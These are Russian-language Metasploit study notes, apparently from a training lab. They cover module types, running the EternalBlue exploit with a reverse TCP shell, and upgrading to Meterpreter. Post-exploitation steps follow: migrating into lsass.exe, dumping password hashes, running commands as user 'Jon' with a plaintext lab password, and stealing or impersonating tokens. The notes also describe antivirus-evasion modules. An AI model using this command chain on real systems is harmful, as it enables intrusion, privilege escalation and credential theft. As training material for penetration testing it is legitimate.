# Metasploit: Introduction

Эксплойт: фрагмент кода, использующий уязвимость, присутствующую в целевой системе.
Уязвимость: ошибка в проектировании, кодировании или логике, затрагивающая целевую систему. Эксплуатация уязвимости может привести к раскрытию конфиденциальной информации или позволить злоумышленнику выполнить код в целевой системе.
Полезная нагрузка: Эксплойт использует уязвимость. Однако, если мы хотим, чтобы эксплойт дал желаемый результат (получение доступа к целевой системе, чтение конфиденциальной информации и т. д.), нам необходимо использовать полезную нагрузку. Полезная нагрузка — это код, который будет выполняться в целевой системе.

Модули и категории. 
Вспомогательный
Здесь можно найти любые вспомогательные модули, такие как сканеры, веб-краулеры и фаззеры.
Смотреть директорию по фото.

Энкодеры
Кодировщики позволят вам зашифровать эксплойт и полезную нагрузку в надежде, что антивирусное решение, основанное на сигнатурах, сможет их пропустить.
Смотреть директорию по фото.

Уклонение
Хотя кодировщики и шифруют полезную нагрузку, их не следует рассматривать как прямую попытку обойти антивирусное программное обеспечение. С другой стороны, модули «обхода» будут пытаться это сделать, с большей или меньшей вероятностью.
Смотреть директорию по фото.

Эксплойты
Уязвимости, аккуратно сгруппированные по целевым системам.
Смотреть директорию по фото.

NOPs
Операции NOP (No Operation) буквально ничего не делают. В семействе процессоров Intel x86 они обозначаются кодом 0x90, после которого процессор ничего не делает в течение одного такта. Часто они используются в качестве буфера для обеспечения стабильного размера полезной нагрузки.
Смотреть директорию по фото.

Payloads
Полезная нагрузка — это код, который будет выполняться в целевой системе.
Смотреть директорию по фото.
Адаптеры: Адаптер оборачивает отдельные полезные нагрузки для преобразования их в различные форматы. Например, обычную полезную нагрузку можно обернуть в адаптер PowerShell, который создаст одну команду PowerShell для выполнения этой полезной нагрузки.
Однокомпонентные программы: автономные полезные нагрузки (добавление пользователя, запуск notepad.exe и т. д.), для работы которых не требуется загрузка дополнительных компонентов.
Загрузчики (Stagers): отвечают за установление канала связи между Metasploit и целевой системой. Полезны при работе с загрузкой данных на этапе подготовки. При использовании «загрузчиков на этапе подготовки» сначала загружается загрузчик на целевую систему, а затем загружается остальная часть данных (этап). Это дает некоторые преимущества, поскольку начальный размер данных будет относительно небольшим по сравнению с полным объемом данных, отправленных за один раз.
Этапы: Загружаются загрузчиком. Это позволит использовать полезные нагрузки большего размера.

Post
Модули, используемые после взлома, будут полезны на заключительном этапе процесса тестирования на проникновение, описанного выше, после его завершения.


Применение:

Запуск командой 
./msfconsole

После ввода 
use exploit/windows/smb/ms17_010_eternalblue 

«msf6 exploit(windows/ smb /ms17_010_eternalblue)». 
В командной строке указано, что теперь у нас есть контекст, в котором мы будем работать. Это можно увидеть, введя команду: 
show options.
Пример: 
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

В параметрах можно устанавливать различные параметры допустим:
   LHOST     10.10.220.191    
  LPORT     4444 

LHOST — это IP-адрес твоей машины, который обычно используется для создания обратного соединения с твоей машиной после успешной атаки. RHOST — это IP-адрес целевого хоста
Либо просто сессию: Сессия — это существующее соединение с целевой системой, которое будет использовать модуль постэксплуатации. 

Все параметры задаются с использованием одного и того же синтаксиса команд:
set PARAMETER_NAME VALUE

После  установить payload  
set payload windows/x64/shell/reverse_tcp

Можно прочекать сам эксплойт командой
check

После надо запустить сам  эксплойт 
Запуск самого эксплойта через команду
 run

Команду show можно использовать в любом контексте, указав тип модуля (вспомогательный, полезная нагрузка, эксплойт и т. д.) 
К примеру:
msf6 exploit(windows/smb/ms17_010_eternalblue) > show payloads

search Команда выполнит поиск в базе данных Metasploit Framework модулей, соответствующих заданному параметру поиска. Вы можете проводить поиск, используя номера CVE, названия эксплойтов (eternalblue, heartbleed и т. д.) или целевую систему.


Преобразование обычной оболочки (shell) в Meterpreter

Чтобы это сделать мы через  уязвимость загрузили шел и отправили его в фон командой ctrl + z  на целевую машину и теперь апргейдим его с помощью meterpreter

После получения обычной shell сессии
msf6 > sessions -l
Выведет в консоль наши активные сессии к примеру:
1         shell linux               192.168.1.10:4444 -> 192.168.1.100:12345

Использование модуля для апгрейда
msf6 > use post/multi/manage/shell_to_meterpreter
msf6 post(multi/manage/shell_to_meterpreter) > show options

Устанавливаем нашу сессию  
 set SESSION 1
Устанавливаем наш LHOST 
set LHOST 192.168.1.10

Запускаем наш код командой 
run 

И  в конце проверяем наш Meterpreter
2         meterpreter x86/linux              192.168.1.10:4433 -> 192.168.1.100:54321

Подключение к нашей ссесии meterpreter
msf6 > sessions -i 2
или просто 
msf6 > sessions 2

После этого желательно мигрировать в системный процесс
meterpreter > migrate 1234
Миграция нужна для: 
Устойчивость
Скрытность
Повышение привилегий: Некоторые процессы работают от имени SYSTEM (
Миграция в такой процесс дает вам права system
Пример: из user → миграция в lsass.exe (SYSTEM) = полный контроль
Обход DEP/ASLR

После мы можем использовать heshdump для просмотра хеша паролей, расшифровать их и использовать для входа в систему.

Теперь мы можем получить лоступ к системе от именни Jon
Подключись к сессии SYSTEM
msf6 > sessions -i 250

Запустить cmd от имени Jon
meterpreter > execute -H -c -f cmd.exe -a "/c whoami > C:\\jon_test.txt" -u Jon -p alqfna22

Проверь результат
meterpreter > shell
C:\> type C:\jon_test.txt
Должно быть: JON-PC\Jon или подобное

ИЛИ

Имперсонация токена (если Jon вошел в систему):
meterpreter > load incognito
meterpreter > list_tokens -u

Ищешь Jon в списке
Если есть:
meterpreter > impersonate_token .\\Jon
meterpreter > getuid

Теперь ты Jon

Чтобы вернуться к SYSTEM:
meterpreter > rev2self

Так же мы можем красть токены
Ищем процессы, где вошел Jon

meterpreter > ps | grep "explorer\|winlogon"

Находим explorer.exe с пользователем Jon
Пытаемся украсть токен

meterpreter > steal_token <PID_explorer>

Бывают проблемы одна из возможны решений это обновить сессию самая простая 

Апгрейд последней сессии
sessions -u -1

Апгрейд всех shell сессий
sessions -u

Апгрейд конкретной сессии
sessions -u 2
